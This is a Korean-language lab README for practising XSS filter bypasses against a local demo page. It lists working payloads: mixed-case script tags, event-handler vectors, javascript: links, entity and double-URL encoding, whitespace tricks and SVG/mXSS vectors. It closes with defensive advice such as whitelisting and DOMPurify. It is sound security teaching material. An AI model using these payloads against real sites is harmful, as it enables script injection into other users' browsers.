# 04. 필터 우회 기법 실습

> xss.md 연결: 4장 (필터 우회 및 인코딩 기법)

## 실행 방법

```bash
open xss/04-filter-bypass/bypass_demo.html
```

서버 불필요. 브라우저에서 직접 파일 열기.

## 우회 기법 직접 실습

bypass_demo.html을 열고 각 기법 섹션의 "테스트" 버튼을 클릭하거나,
"약한 필터 시뮬레이터"에 직접 페이로드를 입력해보세요.

### B-01. 대소문자 혼합

```html
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
```

**왜 통하나**: 필터가 정규식에 `i` 플래그 없이 소문자만 매칭

### B-02. 이벤트 핸들러

script 태그 없이 JS 실행:
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
```

### B-03. javascript: 프로토콜

```html
<a href="javascript:alert(1)">클릭</a>
<a href="JAVASCRIPT:alert(1)">대문자도 작동</a>
<a href="&#106;avascript:alert(1)">엔티티 혼합</a>
```

### B-04. HTML 엔티티 인코딩

`alert` 단어를 필터링하는 경우:
```html
<!-- 10진수 엔티티 -->
onerror=&#97;&#108;&#101;&#114;&#116;(1)

<!-- 16진수 엔티티 -->
onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)
```

### B-05. URL 이중 인코딩

```
일반: <script> = %3Cscript%3E
이중: %3C = %253C (% → %25)

서버가 1번만 디코딩하고 필터링, 2번째 디코딩 후 출력하면 우회됨
```

### B-06. 속성 공백 조작

```html
<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>     <!-- 탭 -->
<img %0a src=x onerror=alert(1)>   <!-- 개행 -->
```

### B-07. SVG 벡터

```html
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x></svg>
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
```

## 방어 핵심

블랙리스트(Blacklist) 방식은 항상 우회 가능성 있음.

**올바른 방어**:
- 화이트리스트(Whitelist): 허용할 문자/패턴만 정의
- PHP: `htmlspecialchars()` + `strip_tags()` 조합
- JS: `textContent` 사용 (innerHTML 금지)
- 라이브러리: DOMPurify (어쩔 수 없이 HTML 렌더링 시)
